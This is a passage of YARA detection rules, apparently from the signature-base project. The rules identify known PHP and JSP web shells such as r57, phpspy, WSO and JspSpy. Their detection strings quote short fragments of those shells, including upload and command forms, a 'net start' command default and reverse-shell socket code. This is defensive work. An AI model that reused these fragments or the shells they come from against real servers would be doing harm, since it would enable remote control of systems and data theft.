		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2088-L2107"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "3605e1304fb314c13d6c94d6ac9337731c6ee4fef679444d599cb3ae29023b56"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "37603e44ee6dc1c359feb68a0d566f76"
		hash1 = "a7e25b8ac605753ed0c438db93f6c498"
		hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
		hash3 = "4cc68fa572e88b669bce606c7ace0ae9"
		hash4 = "fa87bbd7201021c1aefee6fcc5b8e25a"

	strings:
		$s2 = "<small>jsp File Browser version <%= VERSION_NR%> by <a"
		$s3 = "else if (fName.endsWith(\".mpg\") || fName.endsWith(\".mpeg\") || fName.endsWith"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Itsec_Itsecteam_Shell_Jhn
{
	meta:
		description = "Web Shell - from files itsec.php, itsecteam_shell.php, jHn.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2108-L2125"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "2775d7e47a26e06ea716bdca32a0f768eccf4d269caa3d107b4a78f8684ce741"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "8ae9d2b50dc382f0571cd7492f079836"
		hash1 = "bd6d3b2763c705a01cc2b3f105a25fa4"
		hash2 = "40c6ecf77253e805ace85f119fe1cebb"

	strings:
		$s4 = "echo $head.\"<font face='Tahoma' size='2'>Operating System : \".php_uname().\"<b"
		$s5 = "echo \"<center><form name=client method='POST' action='$_SERVER[PHP_SELF]?do=db'"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Jspspy_Jspspyjdk5_Jspspyjdk51_Luci_Jsp_Spy2009_M_Ma3_Xxx
{
	meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2144-L2187"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "6c61e5ccd4800f0cfd20532ab43f917f39a7367cc09cbe92e5320eb2c97fabf3"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
		hash4 = "8b457934da3821ba58b06a113e0d53d9"
		hash5 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
		hash6 = "14e9688c86b454ed48171a9d4f48ace8"
		hash7 = "b330a6c2d49124ef0729539761d6ef0b"
		hash8 = "d71716df5042880ef84427acee8b121e"
		hash9 = "341298482cf90febebb8616426080d1d"
		hash10 = "29aebe333d6332f0ebc2258def94d57e"
		hash11 = "42654af68e5d4ea217e6ece5389eb302"
		hash12 = "88fc87e7c58249a398efd5ceae636073"
		hash13 = "4a812678308475c64132a9b56254edbc"
		hash14 = "9626eef1a8b9b8d773a3b2af09306a10"
		hash15 = "344f9073576a066142b2023629539ebd"
		hash16 = "32dea47d9c13f9000c4c807561341bee"
		hash17 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash18 = "655722eaa6c646437c8ae93daac46ae0"
		hash19 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash20 = "9c94637f76e68487fa33f7b0030dd932"
		hash21 = "6acc82544be056580c3a1caaa4999956"
		hash22 = "6aa32a6392840e161a018f3907a86968"
		hash23 = "349ec229e3f8eda0f9eb918c74a8bf4c"
		hash24 = "3ea688e3439a1f56b16694667938316d"
		hash25 = "ab77e4d1006259d7cbc15884416ca88c"
		hash26 = "71097537a91fac6b01f46f66ee2d7749"
		hash27 = "2434a7a07cb47ce25b41d30bc291cacc"
		hash28 = "7a4b090619ecce6f7bd838fe5c58554b"

	strings:
		$s8 = "\"<form action=\\\"\"+SHELL_NAME+\"?o=upload\\\" method=\\\"POST\\\" enctype="
		$s9 = "<option value='reg query \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\T"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_2_520_Job_Ma1_Ma4_2
{
	meta:
		description = "Web Shell - from files 2.jsp, 520.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2188-L2208"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "db76ff42079b20d9e5c40661d7b30206e6bffc828f55daa4dc210662068f8e27"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "64a3bf9142b045b9062b204db39d4d57"
		hash1 = "9abd397c6498c41967b4dd327cf8b55a"
		hash2 = "56c005690da2558690c4aa305a31ad37"
		hash3 = "532b93e02cddfbb548ce5938fe2f5559"
		hash4 = "6e0fa491d620d4af4b67bae9162844ae"
		hash5 = "7eabe0f60975c0c73d625b7ddf7b9cbd"

	strings:
		$s4 = "_url = \"jdbc:microsoft:sqlserver://\" + dbServer + \":\" + dbPort + \";User=\" "
		$s9 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getR"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Wso2_5_1_Wso2_5_Wso2
{
	meta:
		description = "Web Shell - from files wso2.5.1.php, wso2.5.php, wso2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2256-L2273"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "f2dce52f1b8d2c33cd8478a468383a87f13712dc6e5c9050fea6ede4f0d24cc5"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "dbeecd555a2ef80615f0894027ad75dc"
		hash1 = "7c8e5d31aad28eb1f0a9a53145551e05"
		hash2 = "cbc44fb78220958f81b739b493024688"

	strings:
		$s7 = "$opt_charsets .= '<option value=\"'.$item.'\" '.($_POST['charset']==$item?'selec"
		$s8 = ".'</td><td><a href=\"#\" onclick=\"g(\\'FilesTools\\',null,\\''.urlencode($f['na"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_000_403_C5_Querydong_Spyjsp2010_T00Ls
{
	meta:
		description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp, t00ls.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2274-L2294"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "6f507499304a7cf4d14a134a4c0781fed9a94c40fe3257a4168bacdf3910ffec"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "8b457934da3821ba58b06a113e0d53d9"
		hash3 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash4 = "655722eaa6c646437c8ae93daac46ae0"
		hash5 = "9c94637f76e68487fa33f7b0030dd932"

	strings:
		$s8 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')"
		$s9 = "\"<p><input type=\\\"hidden\\\" name=\\\"selectDb\\\" value=\\\"\"+selectDb+\""

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_404_Data_Suiyue
{
	meta:
		description = "Web Shell - from files 404.jsp, data.jsp, suiyue.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2295-L2311"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "7f4ab5dbd2a72574c5d188e14ae98e599359b2d662266fc4c3a39d3d4405c208"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "7066f4469c3ec20f4890535b5f299122"
		hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
		hash2 = "c93d5bdf5cf62fe22e299d0f2b865ea7"

	strings:
		$s3 = " sbCopy.append(\"<input type=button name=goback value=' \"+strBack[languageNo]+"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_R57Shell_R57Shell127_Sniper_SA_Shell_Egy_Spider_Shell_V2_R57_Xxx
{
	meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2312-L2337"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "04a58352202538d5446f1000c07341ea70434f00403f116233f335213687636e"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "ef43fef943e9df90ddb6257950b3538f"
		hash1 = "ae025c886fbe7f9ed159f49593674832"
		hash2 = "911195a9b7c010f61b66439d9048f400"
		hash3 = "697dae78c040150daff7db751fc0c03c"
		hash4 = "513b7be8bd0595c377283a7c87b44b2e"
		hash5 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash6 = "e5b2131dd1db0dbdb43b53c5ce99016a"
		hash7 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash8 = "41af6fd253648885c7ad2ed524e0692d"
		hash9 = "6fcc283470465eed4870bcc3e2d7f14d"

	strings:
		$s2 = "echo sr(15,\"<b>\".$lang[$language.'_text58'].$arrow.\"</b>\",in('text','mk_name"
		$s3 = "echo sr(15,\"<b>\".$lang[$language.'_text21'].$arrow.\"</b>\",in('checkbox','nf1"
		$s9 = "echo sr(40,\"<b>\".$lang[$language.'_text26'].$arrow.\"</b>\",\"<select size="

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_807_A_Css_Dm_He1P_Jspspy_Xxx
{
	meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2338-L2376"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "eb045425a9f519dd7bf028a7795b16b89768682f5850b6a4d45f0991bfeb6431"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash1 = "76037ebd781ad0eac363d56fc81f4b4f"
		hash2 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
		hash3 = "14e9688c86b454ed48171a9d4f48ace8"
		hash4 = "b330a6c2d49124ef0729539761d6ef0b"
		hash5 = "d71716df5042880ef84427acee8b121e"
		hash6 = "341298482cf90febebb8616426080d1d"
		hash7 = "29aebe333d6332f0ebc2258def94d57e"
		hash8 = "42654af68e5d4ea217e6ece5389eb302"
		hash9 = "88fc87e7c58249a398efd5ceae636073"
		hash10 = "4a812678308475c64132a9b56254edbc"
		hash11 = "9626eef1a8b9b8d773a3b2af09306a10"
		hash12 = "344f9073576a066142b2023629539ebd"
		hash13 = "32dea47d9c13f9000c4c807561341bee"
		hash14 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash15 = "6acc82544be056580c3a1caaa4999956"
		hash16 = "6aa32a6392840e161a018f3907a86968"
		hash17 = "349ec229e3f8eda0f9eb918c74a8bf4c"
		hash18 = "3ea688e3439a1f56b16694667938316d"
		hash19 = "ab77e4d1006259d7cbc15884416ca88c"
		hash20 = "71097537a91fac6b01f46f66ee2d7749"
		hash21 = "2434a7a07cb47ce25b41d30bc291cacc"
		hash22 = "7a4b090619ecce6f7bd838fe5c58554b"

	strings:
		$s1 = "\"<h2>Remote Control &raquo;</h2><input class=\\\"bt\\\" onclick=\\\"var"
		$s2 = "\"<p>Current File (import new file name and new file)<br /><input class=\\\"inpu"
		$s3 = "\"<p>Current file (fullpath)<br /><input class=\\\"input\\\" name=\\\"file\\\" i"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_201_3_Ma_Download
{
	meta:
		description = "Web Shell - from files 201.jsp, 3.jsp, ma.jsp, download.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2377-L2396"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "14eccd07e7bef9d570f75fc4adc204d175dcfbb5b950bdb3e25a65d3c5bb0310"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "a7e25b8ac605753ed0c438db93f6c498"
		hash1 = "fb8c6c3a69b93e5e7193036fd31a958d"
		hash2 = "4cc68fa572e88b669bce606c7ace0ae9"
		hash3 = "fa87bbd7201021c1aefee6fcc5b8e25a"

	strings:
		$s0 = "<input title=\"Upload selected file to the current working directory\" type=\"Su"
		$s5 = "<input title=\"Launch command in current directory\" type=\"Submit\" class=\"but"
		$s6 = "<input title=\"Delete all selected files and directories incl. subdirs\" class="

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Browser_201_3_400_In_Jfolder_Jfolder01_Jsp_Leo_Ma_Warn_Webshell_Nc_Download
{
	meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2397-L2424"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "0bf0fd37b542c9362a47180ee03ea28995b48d483f72273e472292a320a3ddee"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "37603e44ee6dc1c359feb68a0d566f76"
		hash1 = "a7e25b8ac605753ed0c438db93f6c498"
		hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
		hash3 = "36331f2c81bad763528d0ae00edf55be"
		hash4 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash5 = "8979594423b68489024447474d113894"
		hash6 = "ec482fc969d182e5440521c913bab9bd"
		hash7 = "f98d2b33cd777e160d1489afed96de39"
		hash8 = "4b4c12b3002fad88ca6346a873855209"
		hash9 = "4cc68fa572e88b669bce606c7ace0ae9"
		hash10 = "e9a5280f77537e23da2545306f6a19ad"
		hash11 = "598eef7544935cf2139d1eada4375bb5"
		hash12 = "fa87bbd7201021c1aefee6fcc5b8e25a"

	strings:
		$s4 = "UplInfo info = UploadMonitor.getInfo(fi.clientFileName);" fullword
		$s5 = "long time = (System.currentTimeMillis() - starttime) / 1000l;" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Shell_Phpspy_2006_Arabicspy
{
	meta:
		description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2425-L2442"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "bd9f1ffdbf94dd5a871fc7c3b31d2357e99265d02bfe1c836f82d251053dce7d"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "791708057d8b429d91357d38edf43cc0"
		hash1 = "40a1f840111996ff7200d18968e42cfe"
		hash2 = "e0202adff532b28ef1ba206cf95962f2"

	strings:
		$s0 = "elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype"
		$s8 = "echo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"P"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_In_Jfolder_Jfolder01_Jsp_Leo_Warn
{
	meta:
		description = "Web Shell - from files in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2443-L2463"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "00c3667438a688b990cf1c8bb6db52be7c6d1b36192dece4e8b07edda68f4b72"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash1 = "8979594423b68489024447474d113894"
		hash2 = "ec482fc969d182e5440521c913bab9bd"
		hash3 = "f98d2b33cd777e160d1489afed96de39"
		hash4 = "4b4c12b3002fad88ca6346a873855209"
		hash5 = "e9a5280f77537e23da2545306f6a19ad"

	strings:
		$s4 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strD"
		$s9 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDi"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Shell_Phpspy_2006_Arabicspy_Hkrkoz
{
	meta:
		description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2506-L2523"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "228e0a73f14da2957f75ae898fdbcf2386deb366df6ddc312162ab723bac44ba"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "791708057d8b429d91357d38edf43cc0"
		hash1 = "40a1f840111996ff7200d18968e42cfe"
		hash2 = "e0202adff532b28ef1ba206cf95962f2"
		hash3 = "802f5cae46d394b297482fd0c27cb2fc"

	strings:
		$s5 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname."

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_2008_2009Lite_2009Mssql
{
	meta:
		description = "Web Shell - from files 2008.php, 2009lite.php, 2009mssql.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2544-L2561"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "ae33048856440e25972aa5483b60e775f50f60a9ef5e77a58edd60eacdcd9ee3"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "3e4ba470d4c38765e4b16ed930facf2c"
		hash1 = "3f4d454d27ecc0013e783ed921eeecde"
		hash2 = "aa17b71bb93c6789911bd1c9df834ff9"

	strings:
		$s0 = "<a href=\"javascript:godir(\\''.$drive->Path.'/\\');"
		$s7 = "p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Shell_Phpspy_2005_Full_Phpspy_2005_Lite_Phpspy_2006_Arabicspy_PHPSPY_Hkrkoz
{
	meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "41a0560a-b22e-5028-8ad1-710c5758cb1d"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2562-L2583"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "5da06481cf789e71969a5b54a33bfab41e08a1961cc056604a696203fef48422"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "791708057d8b429d91357d38edf43cc0"
		hash1 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash2 = "42f211cec8032eb0881e87ebdb3d7224"
		hash3 = "40a1f840111996ff7200d18968e42cfe"
		hash4 = "e0202adff532b28ef1ba206cf95962f2"
		hash5 = "0712e3dc262b4e1f98ed25760b206836"
		hash6 = "802f5cae46d394b297482fd0c27cb2fc"

	strings:
		$s0 = "$mainpath_info           = explode('/', $mainpath);" fullword
		$s6 = "if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == \"d"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_807_Dm_Jspspyjdk5_M_Cofigrue
{
	meta:
		description = "Web Shell - from files 807.jsp, dm.jsp, JspSpyJDK5.jsp, m.jsp, cofigrue.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2584-L2603"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "0fc7ac740e147bd3703dac74743b19148aa7bb359cc5f347acf3b0dbe26bf752"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash1 = "14e9688c86b454ed48171a9d4f48ace8"
		hash2 = "341298482cf90febebb8616426080d1d"
		hash3 = "88fc87e7c58249a398efd5ceae636073"
		hash4 = "349ec229e3f8eda0f9eb918c74a8bf4c"

	strings:
		$s1 = "url_con.setRequestProperty(\"REFERER\", \"\"+fckal+\"\");" fullword
		$s9 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_404_Data_In_Jfolder_Jfolder01_Xxx
{
	meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2622-L2644"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "171b811c1b93f99f3070692a91a0462f80d9d52ecf26d7fb7297a8bdd9a4c014"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "7066f4469c3ec20f4890535b5f299122"
		hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
		hash2 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash3 = "8979594423b68489024447474d113894"
		hash4 = "ec482fc969d182e5440521c913bab9bd"
		hash5 = "f98d2b33cd777e160d1489afed96de39"
		hash6 = "4b4c12b3002fad88ca6346a873855209"
		hash7 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
		hash8 = "e9a5280f77537e23da2545306f6a19ad"

	strings:
		$s4 = "&nbsp;<TEXTAREA NAME=\"cqq\" ROWS=\"20\" COLS=\"100%\"><%=sbCmd.toString()%></TE"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Jsp_Reverse_Jsp_Reverse_Jspbd
{
	meta:
		description = "Web Shell - from files jsp-reverse.jsp, jsp-reverse.jsp, jspbd.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2645-L2663"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "cd7409bb6ace3044f3d0bf380133c4fe4a7c0c0309f9d800b397439aa95f81fc"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "8b0e6779f25a17f0ffb3df14122ba594"
		hash1 = "ea87f0c1f0535610becadf5a98aca2fc"
		hash2 = "7d5e9732766cf5b8edca9b7ae2b6028f"

	strings:
		$s0 = "osw = new BufferedWriter(new OutputStreamWriter(os));" fullword
		$s7 = "sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());" fullword
		$s9 = "isr = new BufferedReader(new InputStreamReader(is));" fullword

	condition:
		all of them
}

